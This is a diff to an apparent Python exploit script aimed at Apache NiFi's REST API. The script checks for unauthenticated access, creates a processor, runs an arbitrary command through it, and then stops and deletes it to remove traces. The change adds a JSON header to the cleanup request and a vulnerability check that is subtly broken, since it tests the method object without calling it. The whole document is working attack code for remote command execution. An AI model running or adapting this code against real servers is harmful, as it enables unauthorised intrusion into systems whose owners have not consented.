@@ -6,6 +6,9 @@ import requests as req
 class Exp:
     def __init__(self, url):
         self.url = url
+        self.headers = {
+            "Content-Type": "application/json",
+        }
 
     def check_is_vul(self):
         url = self.url + "/nifi-api/access/config"
@@ -20,16 +23,17 @@ class Exp:
     def clean_up(self, p_id):
         url = self.url + "/nifi-api/processors/" + p_id
         data = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}
-        req.put(url=url + "/run-status", data=json.dumps(data), verify=False)
+        req.put(url=url + "/run-status", data=json.dumps(data),headers=self.headers, verify=False)
         req.delete(url + "/threads", verify=False)
 
     def exploit(self, cmd):
-        g_id = self.fetch_process_group()
-        if g_id:
-            p_id = self.create_process(g_id)
-            if p_id:
-                self.run_cmd(p_id=p_id, cmd=cmd)
-                self.clean_up(p_id=p_id)
+        if self.check_is_vul:
+            g_id = self.fetch_process_group()
+            if g_id:
+                p_id = self.create_process(g_id)
+                if p_id:
+                    self.run_cmd(p_id=p_id, cmd=cmd)
+                    self.clean_up(p_id=p_id)
 
     def run_cmd(self, p_id, cmd):
         url = self.url + "/nifi-api/processors/" + p_id
